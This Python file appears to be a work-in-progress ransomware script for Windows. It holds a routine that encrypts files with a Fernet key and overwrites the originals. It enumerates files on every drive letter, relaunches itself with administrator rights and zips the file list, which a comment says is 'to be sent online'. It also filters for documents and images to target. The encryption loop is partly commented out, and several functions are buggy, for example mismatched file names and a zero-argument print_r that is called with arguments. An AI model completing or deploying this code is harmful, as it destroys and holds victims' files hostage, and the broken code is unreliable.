import base64
import ctypes
import hashlib
import os
import zipfile
import random
import re
import string
import subprocess
import sys
import time
from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

def encrypt_file(file_path: str, F_key: Fernet) -> None:
    try_count = 0
    # READ FILE
    with open(file_path, 'rb') as ef:
        data = ef.read()

    # ENCRYPT
    data = F_key.encrypt(data)

    while os.path.isfile(file_path) or try_count <= 5:
        try:
            # DELETE
            os.remove(file_path)
            # REWRITE FILE
            with open(file_path, 'wb') as ef:
                print_r("rewrite", file_path)
                ef.write(data)
                break
        finally:
            try_count += 1

def print_r():
    pass
"""def encrypt_file(file_path,F_key):
    print_r(f'Encrypthing File : {file_path}')
    try:
         with open(file_path,'rb') as ef:
             data = ef.read()
             print_r('can oppen the data')
    except:
        print_r(f'can\'t oppen the file {file_path}')"""

# files = get_all_accessible()
"""for e in files:
    print_r(encrypt_file(e,cipher))"""


# print_r(f"The folder returned is : {files}")


# allow the program to call and receive powershell cmd
def powershell(cmd) -> subprocess:
    completed = subprocess.run(["powershell", "-Command", cmd], capture_output=True)
    return completed


def is_admin() -> bool:
    '''
    :return: if the program is admin
    '''
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def all_files(start_path: str) -> [str]:
    '''
    :param start_path: path to look all of the children
    :return : all the computer files
    '''
    files_in_directory:[] = []
    for root, dirs, files in os.walk(start_path):
        for file in files:
            file_path = os.path.join(root, file)
            files_in_directory.append(file_path)
            print(file_path)
    return files_in_directory


def save_file(path:str,files:[[str]])->None:
    '''
    Save a multilayer array into a file
    :param path: Where the file should be save
    :param files: Data of the file
    :return: None
    '''
    with open(path,'w', encoding="utf-8") as save:
        for e in files:
            for k in e:
                save.write(f'{k}\n')
        save.close()


def save_specific_files(path:str,files:[str]) -> None:
    '''
    Save a monolayer array
    :param path: Path for the new file to create
    :param files: Data that will go in that file
    :return:
    '''
    with open(path,'w') as save:
        for e in files:
            save.write(f'{e}\n')
    save.close()


def compress_files(path: str, name_to_the_compress_file: str) -> None:
    '''
    Will zip a file into a specified path
    :param path: path where the file to compress is
    :param name_to_the_compress_file: The name you want compressed file should have. Don't forget the extention like .txt
    :return: None
    '''
    # create a file with all the path of the computer
    # Compress the file with all the path to prepare it to be sent online
    with zipfile.ZipFile('Compress.zip', 'w', compression=zipfile.ZIP_DEFLATED,compresslevel=9) as compress:
        compress.write(path,arcname=name_to_the_compress_file)
    compress.close()


def find_file_by_type(data_path: str, file_type: str)->[str]:
    '''
    Split files to get only the wanted one
    :param data_path: The path where the file with the data you want to look is
    :param file_type: the type of the file you want to find like .txt, .docx, .exe...
    :return: array of string with all the file absolute path
    '''
    regex = f'^.*(?:{file_type})' # will look at the extention and take everything before
    reg:[str] = []
    with open(data_path,'r') as data:
        for e in data:
            if re.match(regex,e):
                reg.append(e.replace('\n',''))
    data.close()
    return reg


def find_all_file_from_directory(data_path: str, name_of_directory) -> [str]:
    '''
    Will find all the files that have a specific directory (even partly)
    :param data_path: path where the files is
    :return:
    '''
    regex:str = f'(.*(?:{name_of_directory}).*)'
    reg:[str] = []
    with open(data_path, 'r') as data :
        for e in data:
            if re.match(regex,e):
                reg.append(e)
    data.close()
    return reg


def main():
    # Look if program is admin
    files:[] = []
    base = string.ascii_uppercase

    if True:
    #if is_admin():
        for init_path in base:
            print(f'starting {init_path}')
            files.append(all_files(f'{init_path}:\\'))

            ''''input(f'next ?')
            print_r(files_all)
            own_dir = os.getcwd()  # get is own directory to not encrypt itself
            key = Fernet.generate_key()  # key generator
            cipher = Fernet(key)  # hash the key
            #for e in files:
            #   if e is not own_dir:
            #        encrypt_file(e, cipher)  # the file it receive'''
    else:
        # Re-run the program with admin rights
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    save_file('.\\folders.txt',files)
    compress_files('.\\folders.txt', 'test.txt')
    files:[] = find_file_by_type('.\\folder.txt','.txt')
    files = files + find_file_by_type('.\\folder.txt','.docx')
    files = files + find_file_by_type('.\\folder.txt','.jpg')
    files = files + find_file_by_type('.\\folder.txt','.png')
    save_specific_files('.\\Searched.txt',files)


    input('its over')


if __name__ == "__main__":
    main()